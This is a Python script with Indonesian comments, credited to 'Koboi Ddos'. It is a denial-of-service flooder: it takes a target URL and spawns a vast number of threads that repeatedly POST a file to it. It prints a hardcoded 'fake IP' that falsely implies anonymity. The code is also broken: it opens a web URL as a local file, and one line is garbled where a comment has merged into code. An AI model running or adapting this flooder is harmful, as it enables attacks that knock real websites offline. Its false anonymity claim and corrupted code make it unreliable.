import requests
import threading
import time
import socket

# Informasi pengarang
author = "Koboi Ddos"

# Fungsi untuk mendapatkan IP address
def get_ip_address():
    try:
        # Mendapatkan nama host
        host_name = socket.gethostname()
        # Mendapatkan alamat IP lokal
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except socket.error as e:
        print(f"Gagal mendapatkan alamat IP: {e}")
        return None

# Menampilkan informasi pengarang
print(f"Script ini ditulis oleh: {author}")

# Memasukkan URL yang diinginkan
url = input("Masukkan URL target: ")

# Menampilkan IP address sebelum menjalankan thread-thread
ip_sebelum = get_ip_address()
if ip_sebelum:
    print(f"Alamat IP Anda sebelum menjalankan thread adalah: {ip_sebelum}")
else:
    print("Gagal mendapatkan alamat IP sebelum menjalankan thread.")

# Mendefinisikan IP palsu
fake_ip_address = "18.239.18.95"

# Fungsi yang akan dijalankan oleh setiap thread
def make_request(url, exit_event, thread_id, jumlah_permintaan):
    try:
        for i in range(jumlah_permintaan):
            with open("https://kosred.com/a/iqdmbo.mp4", "rb") as file:  # Membuka file MP4 untuk dibaca dalam mode binary
                files = {"file": file}  # Menyusun payload untuk dikirimkan bersama permintaan POST
                response = requests.post(url, files=files)  # Mengirimkan file sebagai bagian dari permintaan POST
            print(f"Thread-{thread_id}: Permintaan ke {url} berhasil! IP Address: {fake_ip_address}")

            if i == 0:
                time.sleep(0.1)
                jumlah_permintaanenggandakan jumlah permintaan setelah 1 detik pertama
            else:
                time.sleep(0.1)  # Interval waktu 0.1 detik
    except requests.exceptions.RequestException as e:
        print(f"Thread-{thread_id}: Gagal melakukan permintaan ke {url}: {e}")
        exit_event.set()
    except KeyboardInterrupt:
        print(f"Thread-{thread_id}: Ctrl+C ditekan. Menghentikan permintaan...")
        exit_event.set()

# Jumlah thread yang akan digunakan
jumlah_thread = 199999999999999999999999999999999999999999999999999999999999
# Jumlah permintaan yang ingin diulang
jumlah_permintaan_threads = [1,]

# Membuat dan menjalankan thread-thread
exit_event = threading.Event()
threads = []

for i in range(jumlah_thread):
    # Menggunakan nilai jumlah permintaan secara berulang
    jumlah_permintaan = jumlah_permintaan_threads[i % len(jumlah_permintaan_threads)]

    thread = threading.Thread(target=make_request, args=(url, exit_event, i + 1, jumlah_permintaan))
    threads.append(thread)
    thread.start()  

try:
    # Menunggu hingga semua thread selesai
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("Ctrl+C ditekan. Menghentikan semua thread...")

# Menampilkan IP address setelah menjalankan thread-thread
ip_sesudah = get_ip_address()
if ip_sesudah:
    print(f"Alamat IP Anda setelah menjalankan thread adalah: {ip_sesudah}")
else:
    print("Gagal mendapatkan alamat IP setelah menjalankan thread.")
